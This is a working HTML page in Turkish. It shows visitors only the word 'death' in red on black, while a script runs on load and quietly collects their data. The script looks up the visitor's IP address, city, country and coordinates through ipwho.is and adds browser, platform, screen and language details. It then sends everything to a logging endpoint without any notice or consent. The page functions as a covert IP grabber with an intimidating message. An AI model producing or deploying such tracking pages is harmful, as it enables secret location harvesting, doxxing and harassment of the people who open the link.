<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP Konum Projesi</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: black;
      color: red;
      font-size: 50px;
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>
  ölüm

  <script>
    // ipwho.is üzerinden IP tabanlı konum bilgisi almak
    async function getIPLocation() {
      try {
        // ipwho.is -> JSON yanıt döndürür
        // Örnek istek: https://ipwho.is/
        // Örnek cevap (başarılı ise success: true)
        // {
        //   "ip": "8.8.8.8",
        //   "success": true,
        //   "city": "Mountain View",
        //   "country": "United States",
        //   "latitude": 37.4056,
        //   "longitude": -122.0775,
        //   ...
        // }
        const res = await fetch('https://ipwho.is/');
        const data = await res.json();
        if (data.success) {
          return data;
        } else {
          // success = false
          return null;
        }
      } catch (error) {
        console.error("IP tabanlı konum alınırken hata oluştu:", error);
        return null;
      }
    }

    // Sunucuya veri gönderen fonksiyon
    async function sendData() {
      const ipData = await getIPLocation();

      // Varsayılan değerler
      let finalIP = "Bilinmeyen IP";
      let finalLocation = "Konum alınamadı";
      let lat = null;
      let lon = null;

      // ipwho.is dönebildiyse
      if (ipData) {
        finalIP = ipData.ip || finalIP;
        const city = ipData.city || "Bilinmeyen";
        const country = ipData.country || "Bilinmeyen";
        finalLocation = `${city}, ${country}`;
        lat = ipData.latitude || null;
        lon = ipData.longitude || null;
      }

      let userData = {
        ip: finalIP,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        language: navigator.language,
        location: finalLocation,
        latitude: lat,
        longitude: lon
      };

      // Sunucuya (ör. /api/log) POST isteği
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
      });
    }

    // Sayfa açıldığında otomatik çalış
    sendData();
  </script>
</body>
</html>
